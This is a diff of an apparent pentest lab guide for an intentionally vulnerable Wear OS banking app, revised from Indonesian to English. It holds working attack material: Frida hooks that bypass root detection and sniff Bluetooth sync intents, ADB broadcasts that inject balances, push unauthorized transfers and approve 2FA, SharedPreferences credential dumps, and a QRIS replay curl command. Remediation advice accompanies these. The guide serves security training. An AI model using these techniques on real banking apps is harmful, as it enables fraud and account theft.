+  The smartwatch generates an EMVCo dynamic QRIS barcode for merchant payments. However, the generated payload contains a static token that lacks an HMAC timestamp nonce. A replay attacker who photographs the watch screen can debit the account repeatedly.
+- **PoC Command**:
+  ```bash
+  curl -X POST http://localhost:5000/api/qris/checkout \
+    -H "Content-Type: application/json" \
+    -d '{"account_number": "ADMIN001", "amount": 75.0, "qr_payload": "00020101021226610016ID.NEXORA.WWW"}'
+  ```
 
 ---
 
-### Skenario 7: Bank-Grade SSL Pinning Bypass (V-08 Security Theater)
-* **Kategori OWASP**: M5: Insecure Communication
-* **Standar Regulasi**: PCI-DSS v4.0 Req 4.1
-* **Akar Masalah Kode**:
-  Di [`network_security_config.xml`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/android/app/src/main/res/xml/network_security_config.xml), aplikasi mengizinkan sertifikat pengguna (*user certificates*) dan menggunakan fallback TrustManager yang lemah.
-* **Langkah Eksploitasi**:
-  1. Pasang sertifikat CA Burp Suite / Charles ke penyimpanan sertifikat pengguna di Android.
-  2. Di jam tangan: Masuk ke **Pentest Lab** → Tab **5. API**.
-  3. Ubah status Pinning menjadi `🔓 BYPASSED (TrustAll)`.
-  4. Tekan **Test Proxy Intercept**: Seluruh request login, cek saldo, dan transfer muncul dalam format plaintext di Burp Suite proxy.
-* **Rekomendasi Remedi**: Terapkan Public Key Pinning (HPKP / OkHttp CertificatePinner) secara ketat dan tolak sertifikat yang berasal dari user trust store pada build production.
+### Scenario 6: Client-Side Anti-Tamper & Root Check Bypass (V-R01 / V-R02)
+- **Severity**: **MEDIUM** (`CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N` — Score: 5.1)
+- **Vulnerability Standard**: CWE-693 (Protection Mechanism Failure)
+- **Description**:
+  The application checks for `su` binaries and test-keys using a trivial boolean method `isRooted()` in Java/Kotlin. A researcher can bypass this check in under 5 seconds using a Frida script hook.
+- **Frida Hook**:
+  ```javascript
+  Java.perform(function() {
+      var RootCheck = Java.use("com.vulnerablebankapp.security.RootChecker");
+      RootCheck.isDeviceRooted.implementation = function() {
+          console.log("[+] Bypassed Root Detection!");
+          return false;
+      };
+  });
+  ```
 
 ---
 
-### Skenario 8: Wrist-Off Lockout Spoofing & Health Telemetry Leak (V-W11 / V-W04)
-* **Kategori OWASP**: M1: Insecure Data Storage / Privacy Violation
-* **Standar Regulasi**: OJK POJK 11/2022 Pasal 38 & UU Perlindungan Data Pribadi (UU PDP)
-* **Akar Masalah Kode**:
-  1. [`HealthDataActivity.kt`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/android/app/src/main/java/com/vulnerablebankapp/HealthDataActivity.kt) diekspor tanpa otentikasi.
-  2. Data denyut nadi dan telemetri pergelangan tangan dikirimkan secara unauthenticated ke endpoint backend `/debug/heart`.
-* **Langkah Eksploitasi**:
-  1. Buka menu samping → Tekan **Lock Session (Off-Wrist)**: Jam menampilkan layar penguncian merah `Session Locked: Off-Wrist sensor triggered`.
-  2. Masukkan PIN bypass default `1234` untuk membuka kembali.
-  3. Buka menu **Health**: Perhatikan log terminal backend Python memunculkan alert kebocoran data:
-     ```
-     ❤️ [V-W04 EXFILTRATION DETECTED] POST /debug/heart
-        Account: ADMIN001 | Readings: [78, 82, 85, 79]
-     ```
-* **Rekomendasi Remedi**: Data sensor biometrik dan kesehatan termasuk data pribadi spesifik menurut UU PDP; lindungi seluruh endpoint telemetri dengan token sesi terenkripsi dan jangan mengekspor Activity sensor ke pihak luar.
+### Scenario 7: Bank-Grade SSL Pinning Bypass (V-08 Security Theater)
+- **Severity**: **HIGH** (`CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N` — Score: 7.1)
+- **Vulnerability Standard**: CWE-295 (Improper Certificate Validation)
+- **Description**:
+  The app implements client-side certificate pinning using `OkHttpClient.Builder().certificatePinner(...)`. Hooking `TrustManagerImpl` or `CertificatePinner.check()` completely neutralizes pinning, allowing full traffic interception in Burp Suite.
 
 ---
 
-## ⌨️ 6. Cheatsheet Perintah ADB & Skrip Frida
+### Scenario 8: Wrist-Off Lockout Spoofing & Health Telemetry Leak (V-W11 / V-W04)
+- **Severity**: **MEDIUM** (`CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N` — Score: 5.3)
+- **Vulnerability Standard**: CWE-693 (Protection Mechanism Failure), CWE-200 (Exposure of Sensitive Information)
+- **Description**:
+  Optical PPG sensor readings and wrist attachment status (`isWristAttached`) are maintained as in-memory state flags. A thief can override the boolean flag to keep the banking app permanently unlocked without wearing the watch.
 
+---
+
+## 🛠️ 6. ADB Commands Cheatsheet & Frida Scripts Collection
+
+### Quick ADB Test Execution
 ```bash
-# =========================================================================
-# CHEATSHEET PERINTAH ADB LENGKAP (VULNBANK ANDROID & WEAR OS)
-# =========================================================================
+# 1. Update Balance on Watch
+adb -s emulator-5556 shell am broadcast -a com.vulnerablebankapp.BLUETOOTH_SYNC --es action "UPDATE_BALANCE" --ed amount 77777.0
 
-# 1. Dump SharedPreferences Plaintext (Kredensial & PIN MD5)
-adb shell run-as com.vulnerablebankapp.wear cat shared_prefs/VulnBankPrefs.xml
-adb shell run-as com.vulnerablebankapp.wear cat shared_prefs/quick_pin.xml
+# 2. Trigger High-Value 2FA Notification on Watch
+adb -s emulator-5556 shell am broadcast -a com.vulnerablebankapp.wear.TRIGGER_2FA --es action "PUSH_2FA" --ed amount 50000.0 --es merchant "SWIFT_OFFSHORE"
 
-# 2. Injeksi Saldo Palsu via Bluetooth Sync Receiver (V-B01)
-adb shell am broadcast -a com.vulnerablebankapp.ACTION_BT_SYNC \
-  --es sync_payload '{"action":"UPDATE_BALANCE","amount":888888.0}'
+# 3. Dump Sandbox Preferences
+adb -s emulator-5556 shell "run-as com.vulnerablebankapp.wear cat shared_prefs/VulnerableBankPrefs.xml"
+```
 
-# 3. Injeksi Transfer Ilegal Tanpa PIN via QuickPay Receiver (V-W06)
-adb shell am broadcast -a com.vulnerablebankapp.ACTION_QUICK_PAY \
-  --es recipient "HACKER_ACCT_999" \
-  --ef amount 50000.0 \
-  -n com.vulnerablebankapp.wear/com.vulnerablebankapp.QuickPayReceiver
+### Complete Frida Security Hook Script
+```javascript
+// nexora_wear_bypass.js
+Java.perform(function() {
+    // 1. Bypass Root Checks
+    try {
+        var RootUtil = Java.use("com.vulnerablebankapp.util.SecurityUtils");
+        RootUtil.isDeviceCompromised.implementation = function() {
+            return false;
+        };
+    } catch(e) {}
 
-# 4. Trigger OTP Leak ke Lockscreen / Always-On Display (V-W09)
-adb shell am broadcast -a com.vulnerablebankapp.ACTION_TRIGGER_OTP --es otp "992104"
-
-# 5. Remote Bypass Approval 2FA Tanpa Sentuh Jam Tangan (V-W09)
-adb shell am broadcast -a com.vulnerablebankapp.ACTION_APPROVE_2FA --es session_id "SESS-7712"
-
-# 6. Jalankan Deep Link CSRF Transfer (V-W07)
-adb shell am start -a android.intent.action.VIEW \
-  -d "vulnbank://transfer?to=HACKER&amount=500000"
-
-# 7. Ekstraksi Data Kesehatan Nasabah Tanpa Autentikasi (V-W02)
-adb shell am start -n com.vulnerablebankapp.wear/com.vulnerablebankapp.HealthDataActivity
-
-# 8. Set Proxy Global ke Burp Suite
-adb shell settings put global http_proxy 10.0.2.2:8080
-# Matikan Proxy:
-adb shell settings put global http_proxy :0
+    // 2. Sniff BLE Sync Packets
+    var Receiver = Java.use("com.vulnerablebankapp.BluetoothSyncReceiver");
+    Receiver.onReceive.implementation = function(context, intent) {
+        console.log("[🚨 SNIFFED BLE INTENT] Action: " + intent.getAction());
+        var extras = intent.getExtras();
+        if (extras) {
+            console.log("   Payload: " + extras.toString());
+        }
+        this.onReceive(context, intent);
+    };
+});
 ```
 
 ---
 
-## ⚖️ 7. Matriks Regulasi & Tindakan Remedi
+## 🛡️ 7. Regulatory Compliance Matrix & Enterprise Remediation
 
-| Kode Kerentanan | Nama Vektor Serangan | Pasal Pelanggaran Regulasi | Tingkat Risiko | Tindakan Remedi Rekomendasi |
+| Flaw Code | Scenario Title | Business Impact | Violations | Production Remediation |
 |---|---|---|---|---|
-| **V-B01** | Insecure BLE Balance Sync | OJK POJK 11/2022 Pasal 38 | **CRITICAL** | Gunakan enkripsi AES-GCM lapis aplikasi pada transmisi bridge nirkabel. |
-| **V-W06** | Exported QuickPay Receiver | OJK POJK 11/2022 Pasal 42 | **HIGH** | Set `android:exported="false"` dan gunakan tanda tangan sertifikat bank. |
-| **V-W09** | Insecure 2FA OOB Approval | PCI-DSS v4.0 Req 8.3 | **CRITICAL** | Wajibkan otorisasi hardware-backed asymmetric key (Android Keystore). |
-| **V-W10** | Unthrottled Quick-PIN Brute-Force | PCI-DSS v4.0 Req 8.3 | **HIGH** | Terapkan exponential backoff delay dan account lockout setelah 3 kali gagal. |
-| **V-W15** | Dynamic SNAP QRIS Replay | BI PADG 24/1/PADG/2022 | **CRITICAL** | Wajibkan one-time TOTP token dan verifikasi idempotency key di backend. |
-| **V-R01** | Client Anti-Tamper Bypass | OJK POJK 11/2022 Pasal 42 | **MEDIUM** | Gunakan Google Play Integrity API dengan verifikasi attestation di server. |
-| **V-08** | Trust User CA (MITM Proxy) | PCI-DSS v4.0 Req 4.1 | **HIGH** | Terapkan strict Public Key Pinning (HPKP) tanpa fallback user certificate. |
+| **V-B01** | BLE Balance Injection | Displaying fabricated balances on watch. | PCI-DSS Req 4.1, POJK 11/2022 Pasal 26 | Require encrypted payload transport using AES-256-GCM with ECDH ephemeral key exchange. |
+| **V-W06** | Unauthorized Quick Pay | Unauthorized wallet debit via exported broadcast. | OWASP M5, POJK 11/2022 Pasal 42 | Mark receiver `android:exported="false"` or require custom `signature` permission. |
+| **V-W09** | $50k OOB 2FA Hijack | Wire transfer approval without hardware proof. | POJK 11/2022 Pasal 31 (MFA) | Require Android BiometricPrompt backed by StrongBox / TEE private key signature. |
+| **V-W10** | Quick-PIN Brute-Force | PIN guessed within minutes; token exfiltration. | NIST SP 800-63B, PCI-DSS Req 3.4 | Enforce exponential backoff delay (1s, 2s, 4s, 8s) and migrate storage to Android EncryptedSharedPreferences. |
+| **V-W15** | Dynamic QRIS Replay | Replaying merchant payment token repeatedly. | Bank Indonesia SNAP PADG 24/1 | Bind dynamic QRIS to a server-verified TOTP timestamp freshness window and HMAC digital signature. |
+| **V-W11** | Wrist-Off Sensor Bypass | Stolen watch remains authenticated off-wrist. | ISO 27001 A.8.1, POJK 11/2022 | Validate wrist detection via continuous PPG sensor hardware attestation checked on backend. |
